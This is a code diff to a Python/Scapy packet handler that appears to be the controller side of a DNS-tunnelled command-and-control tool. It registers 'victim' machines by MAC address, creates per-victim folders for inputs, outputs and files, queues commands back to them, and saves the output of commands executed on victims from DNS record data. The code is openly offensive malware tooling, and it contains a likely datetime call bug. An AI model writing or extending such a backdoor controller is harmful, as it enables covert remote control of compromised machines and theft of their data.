@@ -1,6 +1,7 @@
 """Process a given packet
 """
 import os
+import datetime
 
 from scapy.all import *
 from utils.request_type import RequestType
@@ -29,6 +30,10 @@ class DataReceiver():
         print('ping')
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
+        # Ignore broadcast since Ether() is sent as empty
+        if str(victim_mac) == '00:00:00:00:00:00':
+            return
+
         # If client connecting for first time, create new dir for it
         victim_dir = self.rel_path + str(victim_mac)
         if not os.path.exists(victim_dir):
@@ -39,15 +44,34 @@ class DataReceiver():
         # Send packets back to victim
         for p in pkts:
             self.queue.enqueue(p)
+        
 
     def _receive_data(self, pkt):
         print('receive_data')
 
     def _receive_recpt(self, pkt):
+        # Receiving output from executed command
         print('receipt')
 
+        # Scapy concats the rdata together, even if it exceeds 255 bytes
+        # test = pkt.getlayer(DNSRR)
+        # print(test.rdata)
+
+        # Create a new file with current timestamp with output of command
+        victim_mac = Mac(pkt.getlayer(Ether).src)
+
+        # Ignore broadcast since Ether() is sent as empty
+        if str(victim_mac) == '00:00:00:00:00:00':
+            return
+
+        timestamp = datetime.now().isoformat()
+        with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
+            dnsrr_layer = pkt.getlayer(DNSRR)
+            f.write(dnsrr_layer.rrname[:-1] + '\n') # Command associated with output
+            f.write(dnsrr_layer.rdata)
 
     def _init_victim_dir(self, victim_dir):
         os.mkdir(victim_dir)
         os.mkdir(victim_dir + '/input')
         os.mkdir(victim_dir + '/output')
+        os.mkdir(victim_dir + '/files')
